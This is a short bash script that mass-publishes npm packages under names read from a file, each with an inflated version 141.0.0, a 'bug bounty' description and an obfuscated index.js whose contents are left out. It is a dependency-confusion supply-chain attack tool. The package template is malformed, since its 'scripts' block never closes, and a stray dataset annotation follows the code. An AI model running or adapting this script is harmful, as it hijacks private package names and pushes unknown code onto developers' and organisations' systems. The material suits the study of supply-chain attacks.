#!/bin/bash
POSITIONAL=()
while [[ $# -gt 0 ]]
do
key="$1"
case $key in
    -v|--version)
    VERSION="$2"
    shift # past argument
    shift # past value
    ;;
    -s|--searchpath)
    SEARCHPATH="$2"
    shift # past argument
    shift # past value
    ;;
    -l|--lib)
    LIBPATH="$2"
    shift # past argument
    shift # past value
    ;;
    --default)
    DEFAULT=YES
    shift # past argument
    ;;
    *)    # unknown option
    POSITIONAL+=("$1") # save it in an array for later
    shift # past argument
    ;;
esac
done
set -- "${POSITIONAL[@]}" # restore positional parameters
for i in $(cat dc);
do
echo '
{
  "name": "'$i'",
  "version": "141.0.0",
  "description": "hackerone.com/homosec Bug Bounty Security Reseaarch White Hat",
  "main": "index.js",
  "scripts": {

  "author": "",
  "license": "ISC"
}
' > package.json
echo "...obfuscated index.js..." > index.js
npm publish --access=public 
sleep 10
done;

malice_analysis.similar_legitimate_use: Backup or deployment tools may archive and upload files, but only with user configuration and to trusted destinations, never to hardcoded or unknown servers.
